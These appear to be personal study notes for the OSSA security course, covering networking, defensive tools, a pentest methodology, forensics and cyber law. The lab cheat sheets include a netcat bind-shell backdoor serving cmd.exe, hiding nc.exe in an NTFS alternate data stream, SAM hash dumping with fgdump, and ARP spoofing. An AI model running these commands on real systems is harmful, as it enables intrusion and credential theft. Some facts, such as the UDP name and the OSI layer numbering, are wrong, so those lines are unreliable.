# OSSA NOTES


## I. What is Information Security

### Cybertack Origins (pg 17)

- The Curious
- The Malicious
- The Criminal
- The Competitor
- The Natural
- The Politically- charged

### Basic Security Concepts 

##### CIA Triad (pg 20)

- Confidentiality
- Integrity
- Availability

##### SOB Troika (pg 24)

- Security
- Operations
- Business

##### Ask The Oracle (pg 26)

- site:	
- filetype:
- intitle:
- allintext:
- loc:
- ip:

##### 8 Steps Security Gameplan (pg 27)

1. Identify Centers of Gravity
2. Understand the Threats
3. Gather Information from Stakeholders
4. Develop Baselines
5. User and Corporate Education
6. Establish Platform Defense
7. Establish Business Continuity and Disaster Recovery
8. Maintain Balance

## II. Security Policy Formulation & Defending Your Turf

##### 4Ps of Defence (pg 39)

- Policies
- Procedures
- Platform
- People

### Defending Your Turf: This LANd Is Mine

##### 4 Procedural Steps Of Defending Your Turf (NW & Systems) (pg 42)

1. Vulnerability Identification
2. Platform Lockdown
3. Monitor The Setup
4. Damage Control

## III. Network 101

##### Hub vs. Switch (pg 47)

- Hub will send packets to all ports
- Switch will only send to the intended recipient

### Networking Protocols From A Security Viewpoint

#### OSI 7-layer model (pg 50)

1. Application
2. Presentation
3. Session
4. Transport
5. Network
6. Data Link
7. Physical

#### List open port and program for localhost

`lsof -Pn -i4`

#### Layer 2: Frame (pg 52)

- Max size = 1582 bytes
- Frame header/trailer does synchronization
- Mac address is 6 bytes

##### Frame Device: Switch (pg 53)

- Mixture of hub and bridge
- CAM table stores MAC addresses

#### Layer 3: IP (pg 55)

- Connectionless
- IPv4 Addressing is 32-bits
- IPv6 addressing is 128-bits hexadecimal
- Refer to page 56 for TTL values

![ipv4-header](F:\OSSA\ipv4-header.png)

###### Attack POV: IP (pg 57)

- Private ranges allow spoofed DOS attacks

![](F:\OSSA\iprange.jpg)

- Broadcast allows amplification attacks

#### IP Device: Router (pg 59)

- Routes traffic using static or dynamic routes and segments broadcast domains
- No route to known destination = dropped packet

#### ARP (pg 60)

- Find the IPv4 address held by a MAC address
- IPv6 uses router advertisement frames instead

#### ICMP (pg 66)

- Internet Control Message Protocol
- Protocol at the network layer, on pair with IP
- Packet INternet Groper (PING) is a type of ICMP (echo-request)

#### Layer 4: TCP and UDP (pg 67)

##### 3-Way Handshake

- SYN
- SYN-ACK
- ACK

##### 4-Way Termination

- FIN/ACK from A to B
- ACK from B
- FIN/ACK from B to A
- ACK from A

##### UDP (pg 71)

- Unified Datagram Protocol
- Connectionless
- ‘Best effort’ delivery
- Useful for application like SNMP or DNS where speed is required
- Important to read pg 73

##### UDP Header:  ![](data:image/png;base64,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)

##### TCP Header: ![](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLmjMfU3_S3mwv9wt4_Odoe63hmnHTqlNrxSkdO6_8LCj9M43U)

#### DNS (pg 75)

- Domain Name System
- 13 root servers
- Every computer has a DNS cache

## IV. Defensive Tool & Lockdown (pg 80)

### Firewalls

##### Basics (pg 84)

- Appliance
- Software
- Personal

##### Firewall Types (pg 85)

- Packet Filter
- Stateful Packet Inspection (SPI)
- Application Proxy
- Proxy Firewall (aka Application Firewall / NG firewall)

##### Rules of Thumb (pg 93)

- Inbound (Ingress) blocking
- Outbound (Egress) blocking
- Implicit Deny-All
- In some cases, the blocking may be done by application or both IP/Port and application

##### Firewall Deployment (pg 95)

- Classic/Old-style DMZ Deployment
- Collapsed DMZ Deployment

##### Firewall Resources (pg 97)

###### CD-/Floppy-bootable, Linux-based Firewalls & Routers

- Smoothwall
- Firestarter
- M0n0wall
- FREESCO

###### Windows-based Personal Firewall

- Windows XP/VISTA/7 Built-in Firewall 
- FilSecLab Personal Firewall Pro/Standard
- NetDefender
- Zonelabs’ ZoneAlarm (GUI)



### NIDS (pg 102)

#### Basics

- Network-based Intrusion Detection System
- Place the NIC in promiscuous mode to capture all network traffic

#### Types of Signature (pg 103)

- String Signature
- Port Signature
- Header Signature

#### NIDS Placement

- hubs
- switch-port mirroring
- active taps

#### Example

- SNORT (pg 105)



### HIDS & File-Integrity Checkers (pg 106)

#### Basics

- Focuses on monitoring and analysis on the internals of a computing system
- Uses a database of system objects it should monitor

#### Type of HIDS (pg 109)

- System Integrity Verifiers (SIV)
- Log file monitors (LFM)
- Operating System Patches

#### Examples (pg 111)

- Tripwire
- OSSEC HIDS
- AIDE
- File Checksum Integrity Verifier (FCIV)

### HoneyPot (pg 113)

#### Basics

- A Trap set to detect, deflect or in some manner counteract
- Sugarcane  : honeypot setup as an open proxy (not very common nowadays)
- Entraps attackers, buying time for SysaAdmin to respond
- Low-Interaction and High-Interaction Honeypots (pg 115)

#### Example (pg 118)

- Honeyd



### Other Defences (pg 119)

- Anti-Virus Software



### Cryptography (pg 121)

#### Types of Cipher (pg 123)

- Transposition Cipher
- Substitution Cipher
- Block Cipher
- Stream Cipher

#### Uses of Cryptography (pg 127)

- Providing Integrity by Hashing
- Sending Data using Symmetric Key Encryption
- Remote Networking Using Virtual Private Networking
- Sending Data Using Public-Key Cryptography
- Proving Identity using Digital Signature
- Ransomware



## V. The 5E Attacker Methodology for Penetration-Testing

### Preparation (pg 148)

- Tools are considered untested and suspicious until proven otherwise
- Do not test live / production systems with untested tools
- Use sandboxing
- Check tool authenticity (pg 151)

### 5E Attacker Methodology (pg 155)

- Exploration
- Enumeration
- Exploitation
- Embedding
- Egress

### Exploration (pg 161)

##### Human-Driven Approach

- Social Engineering
- Dumpster Diving
- Physical Violation

##### Computer-aided Approach (pg 163)

- Scoping out PHPBB, Forums, Technical Help postings, Electronic Bulletin Boards
- Domain Registrars and WHOIS
- DNS Servers

###### Examples tools / website

- WHOIS
- `centralops.net`
- `intodns.com`
- `robtex.com`
- `network-tools.com`
- `serversniff.net`
- `dnsbench.com`
- `domainsbyip.com`
- `tools-on.net/net.shtml`

### Enumeration

- War Driving
- Wardialling
- Portscanning
- OS Discovery
- Tracerouting
- Vulnerability assessment
- Web-based Vulnerabilities

###### Tools

- Nmap
- Unicornscan
- Nessus
- HTTPrint
- AMAP

###### Websites

- CVEDetails (`http://cvedetails.com`)
- National Vulnerability Database (`https://web.nvd.nist.gov/view/vuln/search`)
- Common Vulnerabilities & Exposures (`https://cve.mitre.org/cve/cve.html`)
- Shodan Vulnerability Search (`http://www.shodan.io`)
- SecurityFocus Archives (`http://www.securityfocus.com`)
- alpha.hackerwhacker.com/freetools.php (tracerout check for open port)
- t1shopper.com/tools/port-scan (allows list of ports to be scan)
- serversniff.net (webserver, nameserver section, etc)
- mxtoolbox.com (mailserver checks)
- subnetonline.com (lots of stuff)
- Wayback Machine (`https://archive.org/web/`) 



### Exploitation (pg 179)

#### Conducted using (In Increasing order of difficulty):

- Ready-made tools from tool repositories
- Exploit-code compilation (.c files)
- Techniques & Methods
- Self-Crafted tools or ‘sploits’ (“roll your own”)

#### Spoofing & MITM (pg 181)

- The act of assuming somebody’s or some thing’s identity
- Reasons to Spoof:
  - To hide true identity, especially if sending malicious traffic
  - Confuse incident handlers & investigators (e.g. via log file manipulation)
  - Insertion between an established connection or data flow (i.e. session-hijacking/MITM)
- Done successfully using ARP poisoning

#### Denial of Service (pg 184)

- Attempts to disrupt the Availability component of the CIA Triad
- Sending of specially crafted packets to vulnerable applications listening on TCP or UDP ports
- Evolved into Distributed DOS (DDOS)
- Made possible with the usage of Botnets & Zombies (PhatBot) (pg 188)



#### Exploit Fundamentals (pg 195)

- Buffer/Heap Overflows
- Shell Code (www.shell-storm.org/shellcode , packetstormsecurity) (pg 197)
- 2 Types of Shell
  - BIND (listening) Shell
  - Reverse Shell
- Format String Vulnerability
- The Metasploit Framework

#### Web Applications (pg 203)

##### Web-recon tools:

- Netcat
- Stunnel (SSL)
- HTTPrint

##### Web-fuzzing tools:

- Spike Proxy
- Webscarab
- Crowbar
- JBroFuzz

##### Web-interception tools:

- Achilles
- Paros
- Burp Proxy
- SSLstrip

##### Web-Session Management checking tools:

- CookieDigger



##### Web Servers vs Web Application

- Web Server is a network service that serves up content residing either on the web server or behind it (apache web server, IIS web server)
- Web application is customized content, modules and/or functionality that is served up by a web server and require a web server to run (search forms, intranet login portal)



##### OWASP Top 10 (pg 208)

1. Unvalidated Input
2. Broken Access Controls
3. Broken Authentication & Session Management
4. Cross Site Scripting Flaws
5. Buffer Overflows
6. Injection Flaws
7. Improper Error Handling
8. Insecure Storage
9. Application Denial of Service
10. Insecure Configuration Management

#### Password Cracking (pg 211)

SAM Database stores 2 Cryptographic hashes of all user passwords (Windows)

##### LAN Manager (take note of the notes at pg 212)

- Win95/Win98 implements LanMan Authentication
- Not case-sensitive
- LM Hash, with intermediate DES algorithm used
- Maximum 14 characters for LM Hash to be stored and used for authentication to AD. If >14, LM Hash is not used. NTLM is used instead

##### Windows NTLM

- Case-sensitive
- Uses MD4 algorithm

##### Tools/Website

- OPHCrack (pg 214)
- md5decrypter.co.uk
- http://crackstation.net
- md5.my-addr.com



### Embedding (pg 217)

#### Embedding tools:

- Backdoors
- Trojans (RATs)
- Rootkits
  - Traditional Rootkit
  - Kernel Rootkit

#### Defending against Embedding tools (pg 226)

- Checksumming

- System.map

  ##### Programs

  - kern_check.c (program)
  - CheckIDT
  - check-ps
  - Kstat
  - samhain



### Egress (pg 217)

#### Egress involves:

- File Hiding
- Log Modification/Removal
- Executable Removal

#### File Hiding:

###### Linux

- Prefix the file or directory with a “.”
- `ls -a` to show hidden files

###### Windows

- Attribute of file can be checked to “hidden”
- NTFS system can set specific permissions to prevent files from being deleted
- Alternate Data Stream (ADS) (pg 234)
  - Store up to 252 hidden files
  - Applies only to NTFS filesystem
  - Executable can be stored but need to specify the entire file path of the file to be hidden, as well as when you are executing the hidden executable file
  - `notepad message.txt:secret.txt` to hide and show the secret.txt behind message.txt
  - `type c:\6\nc.exe > c:\6\hobbit.txt:hidenc.exe` to hide hidenc.exe behind hobbit.txt
  - `start c:\6\hobbit.txt:hidenc.exe` to run the hidden executable
  - `LADS.exe` will display hidden files in the directory which LADS is running
  - For Windows Vista and up, can run `dir /r` to reveal streamed files
- Advanced ADS (pg 236)
  - can be performed by using `\\?\` and protected device name
- Steganography
  - outguess (hide or transfer information)
  - steg-objects (detect presence of steg-objects)
  - stegdetect (detect presence of steg-objects)

#### Log Modification/Removal 

###### Linux (pg 237)

- uses `syslog` service to keep a record of events that occur in the OS
- syslog does most of its logging to `/var/log`
- Current login log `/var/run/utmp`
- Past login log `/var/log/wtmp`
- Previous methods of logging in log `/var/log/lastlog`

###### Windows (pg 239)

- Windows NT-based system logging is controlled by EventLog service
- Stopping EventLog service will violate Windows NT security model, triggering an automatic reboot in 60 seconds
- The 60seconds reboot can be negated with a rootkit

#### Executable Removal (pg 242)

- For binaries that cannot be hidden
- Removal in a secure manner
- An useful tool is `Eraser`

### Pentest/Audit reporting (pg 243)

- should be done in a face to face manner as far as possible
- Avoid sending an army when meeting external customer
- Should deliver report document to client prior to the meeting in a secure manner. (By hand or GPG/PGP encrypted email)

 

### VI. Wireless (In)Security Introduction (pg 245)

#### WLAN Basics

###### Types of WLANS:

- Personal /SOHO
  - Open
  - Web
  - WPA-PSK / WPA2-PSK
- Enterprise-Level
  - WPA / WPA2
  - VPNoL

#### WarChalking (pg 260)

- Developed from hobo-language
- Warchalks tell you whether there is free 802.11 service in the area
- Mainly found in the west

#### WarDriving

- Looking for free WLAN access
- A crime in many countries
- Can augment WLAN NICs with “cantennas”

#### Typical WLAN Deficiencies (pg 263)

- Not enabling frame-level encryption such as WPA / WPA2
- Using dictionary based WPA-PSK passphrases
- Not turning off SSID broadcasts in Beacon Frames
- Not using MAC or IP address filtering
- Not segmenting the WLAN as a DMZ
- Not turning off unneeded AP services (e.g. telnet, snmp)
- Leave AP settings defaulted (e.g logins & password)
- SSID defaulted/revealing
- Not minimizing the RF emanations



## VII. Incident Response & Computer Forensics

### Incident Response Framework

Incident Response Capabilities are needed for:

- Ability to respond to incidents in a consistent, systematic manner
- Minimize impact to business due to damage, theft or DoS
- To better prepare for handling future incidents and to provide feedback for enhancing current security practices
- Proper handling of legal issues that might stem frim an incident

ThinkSECURE Threat-Liability-Disruption Potential (TLDP) Matrix (TLDP Matrix) (pg 270)

##### Incident Response Policy

##### Incident Response Team Structure & Services (pg 272)

- Team Model
- Staffing Model
- `https://resources.infosecinstitute.com/advantages-disadvantages-outsourcing-incident-response/#gref`

#### Incident Response Phases

1. Preparation (pg 275)
2. Detection & Analysis
3. Containment, Eradication & Recovery
4. Post-Incident Activity

 

### Computer Forensics Introduction (pg 287)

Computer Forensics 

- process by which computer or digital evidence is `Identified`, `Preserved`, `Analyzed`, `Interpreted` and ` Presented`
- CF and IR are directly interconnected and related (pg 291)
- Role of a Computer Forensics Investigator “CFI” (pg 293)
- Chain of Custody (pg 295)

#### Data Acquisition (pg 297)

- Non volatile information
- Volatile information (pg 306)

#### Post-Acquisition : Forensics Analysis & Digital Investigation (pg 310)

- Root cause analysis
- Determine level of destruction
- Find evidence to support prosecution
- Motive establishment
- What is the “suspect” software/malware doing

#### Disk / File Analysis tools (Hex viewer/ editor)

- File Header (pg 313)
- more…

### Forensic Analysis: Information Gathering From Other Sources (pg 319)

- Web Browsing Investigation 
  - Pasco (internet cache)
  - Galleta (cookies)
  - Web Historian
- Email Header Analysis (pg 323)
  - Last one which directly exchanges with own mail relay is often the most reliable
- Malicious Code & Infection Analysis (pg 328)
  1. They need to talk
  2. They need to run
  3. They need to reside somewhere
  4. They need to start somewhere
  5. Legitimate code may be signed by their publishers
  6. They typically hide stuff in binaries
  7. I’m unlikely to be the first to get hit
  8. They need to access something on my system
  9. See what they do inside

## VIII. The Impact of Law

### Reasons to know (pg 343)

- Individual
- Corporate
- Permissible Actions
- Harmonization

### The State of Cybercrime Law (pg 349)

- USA (pg 350)
- Malaysia (pg 352)
- Singapore (pg 352)
- Thailand (pg 352)

### Issues with Enforcement

- Laws are only as good as their enforcement (pg 356)
  - Key issues when it comes to prosecuting cyber criminals: 
    - Insufficient evidence
    - Corrupted/Non-probative evidence
    - The Best Evidence Rule
    - Circumstantial / Indirect Evidence
    - Jurisdictional boundaries
    - Extradition Treaties
    - Prosecution Cost vs Asset Value
- What you as a Security Practitioner need to consider if you assess potential prosecution likely (pg 358)

### When To Enforce (pg 361)

- Singapore Computer Misuse & Cybersecurity Act
- CMA Law Enforcement Rights (pg 362)
- What is an offence (pg 364) (cmca)
- Enhanced Punishment For Damaging Protected Computers (pg 368)







## Snort

- run using `snort -c /etc/snort/snort.conf &` or `snort -A console -c /etc/snort/snort.conf &` which will display out the alerts instead of logging to a file in `/var/log/snort/alert`



## Tripwire

- `tripwire  --init` to take a snapshot of the filesystem specified in the tripwire policy file
- `tripwire --check` to check for any changes in the filesystem
- `twprint -m r –twrfile /var/lib/tripwire/report/<filename> - <timestamp>.twr` to view tripwire report
- `tripwire --update-policy -Z low /etc/tripwire/twpol.txt`  to update the Tripwire database



## Honeyd

- `chown -R nobody *` to change ownership of all files in the Honeyd kit directory to nobody
- `./start-arpd.sh`
- `./start-honeyd.sh`



## DNS Reconnaissance (pg 54 workbook)

- `dig securitystartshere.org` to find IP address from the DNS server your workstation is configured to  use, about the record securitystartshere.org
- `dig securitystartshere.org mx` to find MX (Mail Exchanger) records, from the DNS server your workstation is configured to use, about the record securitystartshere.org. This will tell us which servers are responsible for sending and/or receiving emails for the domain securitystartshere.org
- `dig securitystartshere.org ns` to find NS (name server) records, from the DNS server your workstation is configured to use, about the record securitystartshere.org. This will tell us which servers are responsible for answering domain queries for the domain securitystartshere.org
- `dig securitystartshere.org soa` to find SOA (start of authority) records of the domain securitystartshere.org. 
- `dig @<authoritative nameserver, e.g. ns4191.dns.dyn.com> securitystartshere.org` is used when you know the ip or name of the DNS server for a particular domain. It will yield additional information about the name servers that are responsible for the domain
- `dig @10.50.1.1 pod1.com axfr` will do a zone transfer of the domain `pod1.com` and dump out all the records pertaining to the `pod1.com` domain which it is authoritative for.
- 2 ways to block DNS zone transfer
  - Block TCP port 53
  - Set up the DNS server to only allow certain IP addresses to perform zone transfer



## Whois Reconnaissance (pg 56 workbook)

- `whois securitystartshere.org`
- `whois 202.120.30.50`



## NMAP Port Scanning (pg 58 workbook)

- `nmap -sS -n -Pn -vv -p <target port range> --reason <target IP address> `
- `-sV` to show version of the service running



## OS Determination (pg 62 workbook)

- `xprobe2 10.50.1.1`
- specify open port for more reliable results `tcp:22:open`



## Network Mapping (pg 63 workbook)

- `cheops-agent -n`  to start the server
- `cheaops-ng` to start the client
- click `Viewspace` then `Add Network` to indicate which network range to scan



## Vulnerability Scanning (pg 66 workbook)

- `nessusd -D` to start the server
- `nessus` to start the client



## Web Scanning (pg 71 workbook)

- `./httprint -h http://10.50.1.1 -s <full path to the signatures.txt file` to find webserver version
- `./nikto.pl -host 10.50.1.3` to scan for vulnerabilities in the web server code
- enter a non existent url and see the returned error page which will show the webserver version



## ARP Spoofing (pg 73 workbook)

- `ettercap -G` to start ettercap
- Start `unified sniffing` mode and under `Hosts`, `Scan for hosts`
  - Click on `Hosts lists` to view all the hosts scanned
- Victim is `target 1`
- Gateway is `target 2`

## SSL Man-In-The-Middle (MITM) (pg 79 workbook)

- Burp Proxy
- Burp Suite



## Exploit Code Compilation (pg 79 workbook)

- Packetstormsecurity.org



## The Metasploit Framework (pg 88 workbook)

- msfconsole
- msfweb



## Web Application Exercise (pg 95 workbook)

- Error message can reveal important info



## Password Cracking (pg 116 workbook)

- OPHCrack (3) 
- run `fgdump` to dump out the SAM database
- the password hashes are stored in a .pwdump extension file
  1. Load password file
  2. Start



## Backdoor Deployment (pg 121 workbook)

- `nc -l -p 48800 -e c:\windows\system32\cmd.exe ` (victim)
- `nc <ip addr> 4800` (attacker)



## File Hiding using Alternate Data Stream (ADS) (pg 123 workbook)

- `type c:\6\nc.exe > c:\6\hobbit.txt:hidenc.exe` to hide/stream nc.exe behind hobbit.txt
- `notepad c:\6\message.txt:hidden.txt`  to hide/stream message.txt behind hidden.txt
- LADS.exe can detect ADS



## File Hiding using Steganography (pg 125 workbook)

- S-tools
- PLAY AROUND WITH THE ENCRYPTION TYPE



## Wireless Security - Access Point Detection (pg 131 workbook)

- InSSIDer



## Discover, Recover & Identify Deleted Files 

- foremost -T -i usb.dd (pg 146) (better)



## Browser Forensic Analysis (pg 146 workbook)

- PASCO
- GALLETA



## Detecting HoneyPot

- ` curl <url> 80`
- `nc <url> 80`
- Pg 118 of textbook



## Security Policy Formulation (pg 159 workbook)



Deny firewall rule  will result in nmap showing filtered (no response)

Reject firewall rule  will result in nmap showing filtered (Port unreachable)


